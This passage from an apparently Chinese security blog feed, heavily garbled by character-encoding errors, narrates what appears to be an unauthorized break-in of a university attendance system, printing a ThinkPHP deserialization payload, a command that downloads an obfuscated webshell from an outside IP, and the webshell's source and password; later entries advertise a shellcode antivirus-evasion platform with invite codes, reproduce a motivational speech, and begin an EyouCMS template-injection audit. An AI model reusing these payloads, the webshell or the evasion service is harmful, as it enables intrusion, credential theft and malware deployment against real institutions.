href="http://xxx.xxx.edu.cn/v4/public/index.php/admin/login.html?s=admin/api.Update/tree">http://xxx.xxx.edu.cn/v4/public/index.php/admin/login.html?s=admin/api.Update/tree</a></p><pre><code>PostDataï¼šrules=a%3A2%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A7%3A%22%00%2A%00name%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A9%3A%22%00%2A%00hidden%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A3%3A%22123%22%3B%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00field%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00schema%22%3Ba%3A0%3A%7B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A9%3A%22%00%2A%00hidden%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A3%3A%22123%22%3B%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00field%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00schema%22%3Ba%3A0%3A%7B%7D%7Di%3A1%3Bi%3A123%3B%7D   //æ‰§è¡Œwhoami</code></pre><p><img src="https://i.loli.net/2020/11/13/7MoP6fIlt9Oe1RU.png" alt="image-20201113150348311"></p><p>ä¸‹é¢ä¸ºååºåˆ—åŒ–popé“¾å­å¦‚ä¸‹</p><pre><code class="php">&lt;?phpnamespace think;use think\model\Pivot;abstract class Model&#123;  private $lazySave = false;   # save()  private $exists = false;   # updateData()  protected $connection;  protected $name;       # __toString() Conversion.php =&gt;Pivot  private $withAttr = [];     # assert  protected $hidden = [];  private $data = [];  protected $withEvent = false;  private $force = false;  protected $field = [];  protected $schema = [];   function __construct()&#123;    $this-&gt;lazySave = true;    $this-&gt;exists = true;    $this-&gt;withEvent = false;    $this-&gt;force = true;    $this-&gt;connection = &quot;mysql&quot;;    $this-&gt;withAttr = [&quot;test&quot;=&gt;&quot;system&quot;];    $this-&gt;data = [&quot;test&quot;=&gt;&quot;whoami&quot;];    $this-&gt;hidden = [&quot;test&quot;=&gt;&quot;123&quot;];     $this-&gt;field = [];    $this-&gt;schema = [];  &#125;&#125;namespace think\model;use think\Model;\# Model æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæˆ‘ä»¬æ‰¾åˆ°å®ƒçš„ç»§æ‰¿ç±»ï¼Œæ­¤å¤„é€‰å–çš„æ˜¯ Pivot ç±»class Pivot extends Model&#123;  function __construct($obj=&quot;&quot;)&#123;    parent::__construct();    $this-&gt;name = $obj;     # $this-&gt;nameæ”¾å­ç±»æ„é€ æ–¹æ³•ä¸­èµ‹å€¼ï¼Œç›´æ¥æ”¾åŸºç±»å±æ€§ä¸­åˆå§‹åŒ–ä¸æˆåŠŸ  &#125;&#125;$a=new Pivot();echo urlencode(serialize([new Pivot($a),123]));?&gt;</code></pre><p> <img src="https://i.loli.net/2020/11/13/7MoP6fIlt9Oe1RU.png" alt="image-20201113150348311"></p><p>æƒé™ä¸ºsystemï¼Œå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆï¼Œå¤©åŠ©æˆ‘ä¹Ÿ</p><p>ä½†ä½¿ç”¨echoå‘½ä»¤å†™shellè¿‡ç¨‹ä¸­é‡åˆ°äº†å¾ˆå¤šé—®é¢˜</p><p>â‘ å‘½ä»¤ä¸èƒ½å¸¦ç©ºæ ¼ï¼Œè€Œä¸”&lt;&gt;ç›´æ¥åœ¨ä¸€æ¡å‘½ä»¤ä¸­å‡ºç°å†™shellï¼Œå¦åˆ™ä¼šæŠ¥é”™</p><p>â‘¡ç©ºæ ¼ä¼šè¢«è½¬æ¢ä¸º+ è€Œ+ ä»–åç«¯åˆè¯†åˆ«ä¸äº†</p><p> <img src="https://i.loli.net/2020/11/13/JftkQsum25TDFrb.jpg" alt="image-20201113150348311"> </p><p>ç»è¿‡åšæŒä¸æ‡ˆçš„æ‰‹åŠ¨æµ‹è¯•ï¼Œå‘ç°&#x2F;\å¯ä»¥ç»•è¿‡ç©ºæ ¼çš„é™åˆ¶</p><p>ç„¶åå†ä½¿ç”¨&amp;&amp;æ¥æ‹¼æ¥å‘½ä»¤ï¼Œå®ç°å¯¹äºå†™å…¥&lt;&gt;æ£€æµ‹çš„ç»•è¿‡</p><p>ä½†æ˜¯ç›®æ ‡æœºæœ‰wafï¼Œæ™®é€šçš„webshellä¼ ä¸Šå»è¿‡å‡ ç§’å°±ä¼šè¢«æ€</p><p>ä½•å¦¨ï¼Œç›´æ¥é€šè¿‡æ¡ä»¶ç«äº‰è¿œç¨‹ä¸‹è½½å…æ€çš„webshell</p><p><strong>æ„é€ å‘½ä»¤é€šè¿‡æ¡ä»¶ç«äº‰ä¸‹è½½å…æ€shell</strong></p><p><code>echo/^&lt;^?php&gt;&gt;s1.php&amp;&amp;echo/file_put_contents(&#39;s2.php&#39;,file_get_contents(&#39;http://49.x.x.x:8080/shell.txt&#39;));?^&gt;&gt;&gt;s2.php</code></p><p>å…æ€shellå†…å®¹å¦‚ä¸‹</p><pre><code>&lt;?phpfunction test($php_c0d3)&#123;  $password=&#39;skr&#39;;//EnvPwd  $cr=preg_filter(&#39;/\s+/&#39;,&#39;&#39;,&#39;c h r&#39;);  $bs64=preg_filter(&#39;/\s+/&#39;,&#39;&#39;,&#39;bas e64 _de cod e&#39;);  $gzi=$cr(103).$cr(122).$cr(105).$cr(110);  $gzi.=$cr(102).$cr(108).$cr(97).$cr(116).$cr(101);  $c=$bs64($php_c0d3);  $c=$gzi($c);  @eval($c);&#125;$php_c0d3=&#39;S0lNy8xL1VAvzkjNySlILC5W11EBUeX&#39;.&#39;5RSma1rxcKgWZeWm2KvFBroGhrsEh0UogvlIsUC&#39;.&#39;YzTQMiaatUmVqspFnNy1WQARLI1wBprAXi1LLEH&#39;.&#39;A2EXrgdsZrWAA==&#39;;test($php_c0d3);?&gt;</code></pre><p>é€šè¿‡ååºåˆ—åŒ–popé“¾å­ç”ŸæˆPostdata</p><p>ç›´æ¥æ‰“è¿‡å»</p><p><a href="http://xxx.xxx.edu.cn/v4/public/s2.php">http://xxx.xxx.edu.cn/v4/public/s2.php</a></p><p>å¯†ç Skr</p><p>ç›´æ¥æ‹¿ä¸‹</p><p><a href="https://imgchr.com/i/DpncnS"><img src="https://s3.ax1x.com/2020/11/13/DpncnS.png" alt="DpncnS.png"></a> </p><p>ç»ˆäºæ‹¿ä¸‹äº†è¿™ä¸ªæ‰“å¡ï¼Œæ™šç‚¹åï¼Œè€ƒå‹¤çš„æ ¸å¿ƒç³»ç»Ÿï¼Œadminerè¿›å…¥åº“ä¸­è§£å¯†ç®¡ç†å‘˜å¯†ç </p><p>å¦ˆçš„ï¼Œè¿˜æƒ³è®©è€å­å†™æ£€è®¨ï¼Ÿï¼Ÿï¼Ÿåƒå±å»å§</p><p><img src="https://i.loli.net/2020/11/13/5JviyQlHs17LICn.png" alt="image-20201113151136404"></p><p>æ ¸å¿ƒç³»ç»Ÿå®£å¸ƒæ‹¿ä¸‹~åœ†æ»¡å®Œæˆä»»åŠ¡</p><h3 id="0x07-æ€»ç»“"><a href="#0x07-æ€»ç»“" class="headerlink" title="0x07 æ€»ç»“"></a>0x07 æ€»ç»“</h3><p>æœ¬æ¬¡æ¸—é€è™½ç„¶æ²¡ä»€ä¹ˆå¤ªéªšçš„æ“ä½œï¼Œä½†æ˜¯å¾ˆå¤šåœ°æ–¹éƒ½æ˜¯ç»éªŒä½¿ç„¶</p><p>åŒæ—¶éå¸¸æ„Ÿè°¢M78secæœ‹å‹ä»¬çš„ååŠ©</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BSæ¶æ„åœ¨çº¿Shellcodeå…æ€å¹³å°</title>
      <link href="/2020/08/25/BS%E6%9E%B6%E6%9E%84%E5%9C%A8%E7%BA%BFShellcode%E5%85%8D%E6%9D%80%E5%B9%B3%E5%8F%B0/"/>
      <url>/2020/08/25/BS%E6%9E%B6%E6%9E%84%E5%9C%A8%E7%BA%BFShellcode%E5%85%8D%E6%9D%80%E5%B9%B3%E5%8F%B0/</url>
      
        <content type="html"><![CDATA[<p>å’Œå‡ ä½dalaoå¿™äº†å‡ å¤©</p><p>åˆ©ç”¨PHP+Python+GOä¸‰é—¨è¯­è¨€å†™äº†ä¸€ä¸ªåœ¨çº¿shellcodeå…æ€å¹³å°</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191618365.png" alt="image-20230419161815346"></p><p>åœ¨CSä¸­ç”ŸæˆX64çš„c shellcodeï¼ŒæŒ‰ç…§å¹³å°æŒ‡å®šæ ¼å¼æäº¤ï¼Œå³å¯ä¸€é”®ç”Ÿæˆå…æ€åé—¨ï¼ˆè¿‡æ‰€æœ‰å›½äº§ï¼‰</p><p>æœ¬äººéƒ‘é‡æ‰¿è¯ºï¼Œä¸å«ä»»ä½•åé—¨ï¼Œæ¬¢è¿å„ä½reverseç¡®è®¤ï¼ä¸ºé˜²æ­¢æ»¥ç”¨ï¼Œå°±ä¸å¼€æºå‡ºæ¥äº†</p><p>æˆ‘ä¹Ÿä¸ä¼šæ”¶é›†å¤§ä½¬ä»¬çš„c2 ipï¼Œä»Šå¹´hwæˆ‘å¹¶ä¸å‚åŠ </p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191618899.png" alt="image-20230419161856885"></p><p>æœ¬åœ¨çº¿å¹³å°ä»…é™æ”»é˜²æ¼”ç»ƒã€æˆæƒæ¸—é€æµ‹è¯•ä¸­ä½¿ç”¨ï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼ˆå±…å¿ƒåµæµ‹ä¹‹äººè‡ªé‡ï¼Œæœ¬ç³»ç»Ÿå¸¦æœ‰æº¯æºæœºåˆ¶ï¼‰</p><p>ä½¿ç”¨æ³¨å†Œç è¿›è¡Œè´¦å·æ³¨å†Œåï¼Œä¼šè‡ªåŠ¨è·å–æœ€è¿‘ä¸¤æ¬¡ç™»å½•çš„ipå¹¶è¿›è¡Œç»‘å®šï¼Œå…¶ä»–ipæ— æ³•ç™»å½•ï¼Œä½¿ç”¨æ³¨å†Œç å‰è¯·è°¨æ…<br>è€ƒè™‘</p><p>å¹³å°é“¾æ¥è”ç³»åšä¸»è·å–</p><p>ç°å…è´¹èµ é€5ä¸ªé‚€è¯·ç ï¼Œå¦‚æœæ²¡é¢†åˆ°è”ç³»æˆ‘vx:J0o1ey997ï¼Œå®šæœŸä¼šå‘é‚€è¯·ç </p><p>HXGzVWWxzWCZ63hL3XyHHbbBL5X1QY59</p><p>x1JkgLkNZXvenxBKENFeRw99VWU4JkcI</p><p>2fDUWgCDLPIyz4nlENz3CjJ7ngfjUy3g</p><p>EHF1Bf2JwdunjBtFpjR4xRzGwlGqfzl4</p><p>BJvK7h2CVfK2PdhnKpgxNUdWUEzHFr79</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨å¼€å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>èŠ±å„¿åœ¨ä¸åŒçš„å­£èŠ‚å¼€æ”¾</title>
      <link href="/2020/04/13/%E8%8A%B1%E5%84%BF%E5%9C%A8%E4%B8%8D%E5%90%8C%E7%9A%84%E5%AD%A3%E8%8A%82%E5%BC%80%E6%94%BE/"/>
      <url>/2020/04/13/%E8%8A%B1%E5%84%BF%E5%9C%A8%E4%B8%8D%E5%90%8C%E7%9A%84%E5%AD%A3%E8%8A%82%E5%BC%80%E6%94%BE/</url>
      
        <content type="html"><![CDATA[<p>å½“ä½ æœªæœ‰ç§¯æ·€ï¼Œä¸€å¿ƒé™·äºç‰©æ¬²ä¹‹æ—¶</p><p>å°è¯•è¯»è¯»ä¿æ•æ´ªè¿™ç¯‡æ¼”è®²ç¨¿ã€ŠèŠ±å„¿åœ¨ä¸åŒçš„å­£èŠ‚å¼€æ”¾ã€‹</p><h2 id="èŠ‚é€‰ï¼š"><a href="#èŠ‚é€‰ï¼š" class="headerlink" title="èŠ‚é€‰ï¼š"></a>èŠ‚é€‰ï¼š</h2><p>   <strong>æˆ‘ä»¬çš„ç”Ÿå‘½å’Œå››å­£çš„èŠ±å„¿ä¸€æ ·ï¼Œåœ¨ä¸åŒçš„é˜¶æ®µæœ‰ç€ä¸åŒé˜¶æ®µçš„ç¾ä¸½ï¼šç«¥å¹´çš„çº¯çœŸï¼Œå°‘å¹´çš„éæƒ³ï¼Œé’å¹´çš„å†²åŠ¨ï¼Œä¸­å¹´çš„æˆç†Ÿï¼Œè€å¹´çš„æ™ºæ…§ï¼Œéƒ½æ˜¯äººç”Ÿä¸åŒé˜¶æ®µçš„ç¾ä¸½ã€‚å‡å¦‚æˆ‘ä»¬ä¸€å‡ºç”Ÿå°±åƒè€å¹´äººä¸€æ ·æ´å¯Ÿä¸–äº‹è€äºä¸–æ•…ï¼Œè¿™ä¸€è¾ˆå­å°±æ²¡äº†æœŸå¾…ï¼›å¦‚æœåè¿‡æ¥æˆ‘ä»¬ä¸€è¾ˆå­éƒ½åƒæ¯›å¤´å°ä¼™ä¸€æ ·æ‡µæ‡‚ä¸–äº‹é’æ¶©ç®€å•ï¼Œè¿™ä¸€è¾ˆå­ä¹Ÿå°±æ²¡æœ‰äº†è¿›æ­¥å’Œç²¾å½©ã€‚</strong></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192322007" alt="img"></p><p>â€‹    äººç”Ÿä¹‹æ‰€ä»¥å¯è´µï¼Œåœ¨äºæˆ‘ä»¬åœ¨ä¸åŒçš„é˜¶æ®µæ€»ä¼šæœ‰ä¸åŒçš„æˆé•¿å’Œé¢†æ‚Ÿã€‚<strong>æˆ‘æœ€æ€•çš„å°±æ˜¯ä¸€è¾ˆå­æ²¡æœ‰å˜åŒ–æˆ–è€…æ‰€æœ‰çš„ç²¾å½©ä¸€æ¬¡é‡Šæ”¾å®Œæ¯•ã€‚æ²¡æœ‰å˜åŒ–æ„å‘³ç€åœæ»ä¸å‰ï¼Œä¹Ÿæ„å‘³ç€è’™æ˜§æ— çŸ¥ï¼›æ‰€æœ‰çš„ç²¾å½©ä¸€æ¬¡é‡Šæ”¾å®Œæ¯•æ„å‘³ç€ç”Ÿå‘½å°±åƒå¤œç©ºä¸­çš„ç¤¼èŠ±ï¼Œå°½ç®¡ç²¾å½©å¾—ç‚«ç›®ä½†ä¸€ç¬é—´å°±å½’äºé»‘æš—ã€‚</strong>æˆ‘ä»¬çœ‹åˆ°å¾ˆå¤šå¹´è½»æ—¶å°±æˆåçš„ç”µå½±æ˜æ˜Ÿæˆ–æ­Œæ˜Ÿï¼Œåƒå¤œç©ºçš„æµæ˜Ÿä¸€æ ·ï¼Œé—ªè€€ç™»åœºï¼Œç¬é—´æ¶ˆå¤±ï¼Œæ€»è§‰å¾—æœ‰ç‚¹é—æ†¾ã€‚ç°åœ¨çš„å¾ˆå¤šé’å¹´äººæ€¥äºæ±‚æˆï¼Œçœ‹åˆ°åˆ«äººå¹´è½»æ—¶æˆåŠŸäº†å°±å¾ˆç€æ€¥ï¼Œå¯»æ‰¾å„ç§æ–¹æ³•å–å¾—æ‰€è°“çš„æˆåŠŸï¼Œç”šè‡³ä¸æƒœåœ¨ç½‘ç»œä¸Šè‡ªæš´éšç§ï¼›è¿˜æœ‰å¾ˆå¤šå¤§å­¦ç”Ÿåˆšè¿›å¤§å­¦å°±æƒ³åˆ›ä¸šèµšé’±ï¼ŒæŠŠé€šè¿‡è¯»ä¹¦ç§¯ç´¯è‡ªå·±ä¸€è¾ˆå­åº•è•´è¿™æ ·é‡è¦çš„äº‹æƒ…ç”©åˆ°è„‘åã€‚è¿™äº›äººéƒ½é™·å…¥äº†è¯¯åŒºï¼Œè®¤ä¸ºä¸€æ—¶çš„æˆåŠŸå°±ç­‰äºä¸€ä¸–çš„æˆåŠŸã€‚å…¶å®äººç”Ÿå°±åƒèŠ±å„¿ä¸€æ ·ï¼Œæœ‰çš„äººåœ¨æ˜¥å¤©å°±å¼€æ”¾å‡ºäº†ç¾ä¸½çš„äººç”Ÿä¹‹èŠ±ï¼Œæœ‰çš„äººè¦ç­‰åˆ°å¤å¤©ã€ç§‹å¤©å’Œå†¬å¤©æ‰å¼€æ”¾å‡ºç»šçƒ‚çš„äººç”Ÿä¹‹èŠ±ã€‚</p><p>â€‹    <strong>æˆ‘ä»¬çš„äººç”Ÿå¹¶ä¸ä¼šå› ä¸ºèŠ±å­£æ™šåˆ°å°±ä¸ç²¾å½©ï¼Œä¹Ÿè®¸åè€Œä¼šæ›´åŠ ç²¾å½©ï¼Œå› ä¸ºæˆ‘ä»¬æœ‰æ›´å¤šçš„æœŸå¾…å¹¶ä»˜å‡ºäº†æ›´å¤šçš„åŠªåŠ›ã€‚æ˜¯çš„ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯åŠªåŠ›è¿›å–ï¼ŒæœŸå¾…æœªæ¥ã€‚</strong>æˆ‘ä»¬å¯ä»¥å­¦å­¦å¤å¤©çš„è·èŠ±ã€ç§‹å¤©çš„èŠèŠ±å’Œå†¬å¤©çš„æ¢…èŠ±ï¼Œä¹Ÿè®¸è¶Šæ™šå¼€è¶Šé¦™ï¼Œè¶Šæ™šå¼€èŠ±æœŸè¶Šé•¿å‘¢ã€‚è‚¯å¾·åŸºçš„åˆ›å§‹äººå±±å¾·å£«50å²æ‰å¼€å§‹ç»è¥ä¸€å®¶å°å°çš„å¿«é¤åº—ï¼Œæœ€ååšæˆäº†ä¸–ç•Œä¸Šæœ€å¤§çš„é¤é¥®è¿é”åº—ï¼›å§œå¤ªå…¬80å²çš„æ—¶å€™è¿˜åœ¨æ¸­æ²³ä¸Šé’“é±¼ï¼Œæœ€åç»ˆäºå¾—åˆ°å‘¨æ–‡ç‹çš„é‡ç”¨ï¼Œä¸€èµ·åˆ›å»ºäº†å‘¨æœå…«ç™¾å¹´çš„å¤©ä¸‹ï¼›é½ç™½çŸ³åˆ°90å²è‰ºæœ¯åˆ›ä½œæ‰è¾¾åˆ°äº†é¡¶å³°ã€‚<strong>èŠ±æœ‰è‡ªå·±çš„å­£èŠ‚ï¼Œäººæœ‰è‡ªå·±çš„æ—¶åˆ»ã€‚è‹±æ–‡ä¸­æœ‰ä¸€å¥è°šè¯­å«åšâ€œEvery dog has its dayâ€ï¼Œæ¯æ¡ç‹—éƒ½æœ‰è‡ªå·±çš„å¾—æ„æ—¥å­ï¼Œä½•å†µæˆ‘ä»¬äººå‘¢ã€‚è®©æˆ‘ä»¬è¿‡ä¸€ç§ä»å®¹çš„äººç”Ÿï¼Œåœ¨åŠªåŠ›è¿›å–ä¸­æœŸå¾…ç”Ÿå‘½é²œèŠ±æ€’æ”¾çš„æ—¶åˆ»ã€‚</strong></p><p>â€‹    èŠ±å„¿ä¸€èˆ¬åªå¼€æ”¾ä¸€æ¬¡ï¼Œå®Œæˆç¿çƒ‚çš„ç”Ÿå‘½åï¼ŒåŒ–ä½œæ˜¥æ³¥å†æŠ¤èŠ±ï¼Œå®ˆæŠ¤åä¸€ä»£ç”Ÿå‘½å†æ¬¡ç»½æ”¾å‡ºç¿çƒ‚çš„èŠ±æœµã€‚äººå¯ä»¥æ¯”èŠ±å„¿åšå¾—æ›´å¥½ï¼Œé€šè¿‡æˆ‘ä»¬æŒç»­ä¸æ–­åœ°åŠªåŠ›ï¼Œæˆ‘ä»¬å¯ä»¥è®©ç”Ÿå‘½æŒç»­ä¸æ–­å¼€æ”¾å‡ºç¿çƒ‚ä¹‹èŠ±ã€‚è‹è½¼æ—¢æ˜¯ä¼Ÿå¤§çš„è¯—äººï¼Œä¹Ÿæ˜¯ä¼Ÿå¤§çš„ä¹¦æ³•å®¶ï¼Œåˆæ˜¯ä¸€ä¸ªå¾ˆæˆåŠŸçš„æ”¿æ²»å®¶ï¼›åº·ç†™çš‡å¸æ—¢æ˜¯ä¼Ÿå¤§çš„ç»Ÿæ²»è€…ï¼Œåˆæ˜¯ä¼Ÿå¤§çš„å†›äº‹å®¶ï¼Œè€Œä¸”ç²¾é€šæ±‰æ»¡è’™ä¸‰ç§æ–‡å­—ï¼Œæœ‰å¾ˆå¥½çš„é«˜ç­‰æ•°å­¦å’Œå¤©æ–‡å­¦çŸ¥è¯†ï¼›çˆ±å› æ–¯å¦ä¸‰å²å¤šè¿˜ä¸ä¼šè®²è¯ï¼Œç›´åˆ°ä¹å²æ—¶è®²è¯è¿˜ä¸å¾ˆé€šç•…ï¼Œæ¯ä¸€å¥è¯éƒ½å¿…é¡»ç»è¿‡åƒåŠ›çš„æ€è€ƒæ‰èƒ½è®²å‡ºæ¥ã€‚åœ¨å¿µå°å­¦å’Œä¸­å­¦æ—¶ï¼Œçˆ±å› æ–¯å¦ç”±äºä¸¾æ­¢ç¼“æ…¢ï¼Œä¸çˆ±åŒäººäº¤å¾€ï¼Œè€å¸ˆå’ŒåŒå­¦éƒ½ä¸å–œæ¬¢ä»–ã€‚æ•™ä»–å¸Œè…Šæ–‡å’Œæ‹‰ä¸æ–‡çš„è€å¸ˆå¯¹ä»–å¾ˆåŒæ¶ï¼Œæ›¾ç»å…¬å¼€è¯´ï¼šâ€œçˆ±å› æ–¯å¦ï¼Œä½ é•¿å¤§åè‚¯å®šä¸ä¼šæˆå™¨ã€‚â€ä½†çˆ±å› æ–¯å¦æœ€åæˆäº†ä¸ºäººç±»ä½œå‡ºæ°å‡ºè´¡çŒ®çš„ç§‘å­¦å®¶ï¼Œè€Œä¸”è¿˜æ˜¯ç›¸å½“ä¸é”™çš„ä¸€ä½å°æç´å®¶ã€‚</p><p>   æ‰€ä»¥ï¼Œåªè¦æˆ‘ä»¬ä¸æ–­åŠªåŠ›ï¼Œç”Ÿå‘½çš„èŠ±å­£å°±å¯ä»¥å¾ˆé•¿ï¼Œè€Œä¸”å¯ä»¥ç»½æ”¾å‡ºä¸åŒçš„ç¾ä¸½èŠ±å„¿ã€‚å¾ˆå¤šäººä¸æˆåŠŸæ˜¯æ²¡æœ‰ç»™è‡ªå·±è¶³å¤Ÿçš„æ—¶é—´å’Œè€å¿ƒå»åŠªåŠ›ï¼Œå¾ˆå¤šäººä¸€ç”ŸåªæˆåŠŸäº†ä¸€æ¬¡å°±åƒæµæ˜Ÿä¸€æ ·æ¶ˆå¤±ï¼Œä»–ä»¬éƒ½æ²¡æœ‰æ‡‚å¾—æˆåŠŸæ˜¯ä¸€ç§æŒç»­ä¸æ–­åŠªåŠ›çš„è¿‡ç¨‹ã€‚å½“æˆ‘ä»¬æ‡‚å¾—äººç”Ÿæ¯ä¸ªé˜¶æ®µé€šè¿‡åŠªåŠ›éƒ½èƒ½å¤Ÿç²¾å½©æ—¶ï¼Œä¹Ÿè®¸æˆ‘ä»¬çš„å°‘å¹´å°±ä¼šåƒæ˜¥å¤©çš„æ¡ƒèŠ±ä¸€æ ·ç»šçƒ‚ï¼Œé’å¹´å°±ä¼šåƒå¤å¤©çš„è·èŠ±ä¸€æ ·æ¸…é¦™ï¼Œä¸­å¹´å°±ä¼šåƒç§‹å¤©çš„èŠèŠ±ä¸€æ ·åšå¿ï¼Œè€å¹´å°±ä¼šåƒå†¬å¤©çš„æ¢…èŠ±ä¸€æ ·æ˜‚æ‰¬ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> ç”Ÿæ´»å¶æ‚Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Eyoucms SSTIæ¼æ´å®¡è®¡</title>
      <link href="/2020/03/25/Eyoucms-SSTI%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/"/>
      <url>/2020/03/25/Eyoucms-SSTI%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-å®¡è®¡èµ·å› "><a href="#0x01-å®¡è®¡èµ·å› " class="headerlink" title="0x01 å®¡è®¡èµ·å› "></a>0x01 å®¡è®¡èµ·å› </h3><p><img src="https://s1.ax1x.com/2020/03/25/8xGpDg.png" alt="8xGpDg.png"><br>ç”±äºåœ¨å…ˆçŸ¥æŸ¥çœ‹æ–‡ç« çš„æ—¶å€™æ— æ„çœ‹åˆ°äº†EyouCMSæ¼æ´å¤ç°æ–‡ç« ï¼Œäºæ˜¯äº§ç”Ÿäº†å®¡è®¡ä¹‹å¿ƒ</p><h3 id="0x02-EyouCMSç®€ä»‹"><a href="#0x02-EyouCMSç®€ä»‹" class="headerlink" title="0x02 EyouCMSç®€ä»‹"></a>0x02 EyouCMSç®€ä»‹</h3><blockquote><p>EyouCmsæ˜¯åŸºäºTP5.0æ¡†æ¶ä¸ºæ ¸å¿ƒå¼€å‘çš„å…è´¹+å¼€æºçš„ä¼ä¸šå†…å®¹ç®¡ç†ç³»ç»Ÿï¼Œä¸“æ³¨ä¼ä¸šå»ºç«™ç”¨æˆ·éœ€æ±‚ã€‚æä¾›æµ·é‡å„è¡Œä¸šæ¨¡æ¿ï¼Œé™ä½ä¸­å°ä¼ä¸šç½‘ç«™å»ºè®¾ã€ç½‘ç»œè¥é”€æˆæœ¬ï¼Œè‡´åŠ›äºæ‰“é€ ç”¨æˆ·èˆ’é€‚çš„å»ºç«™ä½“éªŒã€‚è¿™æ˜¯ä¸€å¥—å®‰å…¨ã€ç®€æ´ã€å…è´¹çš„æµè¡ŒCMSï¼ŒåŒ…å«å®Œæ•´åå°ç®¡ç†ã€å‰å°å±•ç¤ºï¼Œç›´æ¥ä¸‹è½½å®‰è£…å³å¯ä½¿ç”¨ã€‚ æ¼”ç¤ºç½‘å€ï¼š[<a href="http://demo.eyoucms.com][2]">http://demo.eyoucms.com][2]</a> å®˜æ–¹ç½‘ç«™ï¼š[<a href="http://www.eyoucms.com][3]">http://www.eyoucms.com][3]</a></p></blockquote><h3 id="0x03-ä»£ç åˆ†æ"><a href="#0x03-ä»£ç åˆ†æ" class="headerlink" title="0x03 ä»£ç åˆ†æ"></a>0x03 ä»£ç åˆ†æ</h3><p>è¿›å…¥<code>/application/api/controller/Ajax.php</code>ä¸­çš„**<code>function get_tag_memberlist</code>**æ–¹æ³•</p><pre><code class="php">public function get_tag_memberlist()&#123;    if (IS_AJAX_POST) &#123;        $htmlcode = input(&#39;post.htmlcode/s&#39;);        $htmlcode = htmlspecialchars_decode($htmlcode);        $attarray = input(&#39;post.attarray/s&#39;);        $attarray = htmlspecialchars_decode($attarray);        $attarray = json_decode(base64_decode($attarray));        /*æ‹¼æ¥å®Œæ•´çš„memberlistæ ‡ç­¾è¯­æ³•*/        $innertext = &quot;&#123;eyou:memberlist&quot;;        foreach ($attarray as $key =&gt; $val) &#123;            if (in_array($key, [&#39;js&#39;])) &#123;                continue;            &#125;            $innertext .= &quot; &#123;$key&#125;=&#39;&#123;$val&#125;&#39;&quot;;        &#125;        $innertext .= &quot; js=&#39;on&#39;&#125;&quot;;        $innertext .= $htmlcode;        $innertext .= &quot;&#123;/eyou:memberlist&#125;&quot;;        /*--end*/        $msg = $this-&gt;display($innertext); // æ¸²æŸ“æ¨¡æ¿æ ‡ç­¾è¯­æ³•        $data[&#39;msg&#39;] = $msg;        $this-&gt;success(&#39;è¯»å–æˆåŠŸï¼&#39;, null, $data);    &#125;    $this-&gt;error(&#39;åŠ è½½å¤±è´¥ï¼&#39;);&#125;</code></pre><p>3 Line: åˆ¤æ–­æ˜¯å¦AJAXè¯·æ±‚<br>4 Line: ä»postè·å–ç”¨æˆ·è¾“å…¥å‚æ•°htmlcodeçš„å€¼å¹¶å°†ç»“æœèµ‹å€¼ç»™$htmlcode<br>5 Line: å°†$htmlcodeä¸­çš„å®ä½“å­—ç¬¦è½¬æ¢ä¸ºæ­£å¸¸å­—ç¬¦<br>7 Line: ä»postè·å–ç”¨æˆ·è¾“å…¥å‚æ•°attarrayçš„å€¼å¹¶å°†ç»“æœèµ‹å€¼ç»™$attarray<br>8 Line: 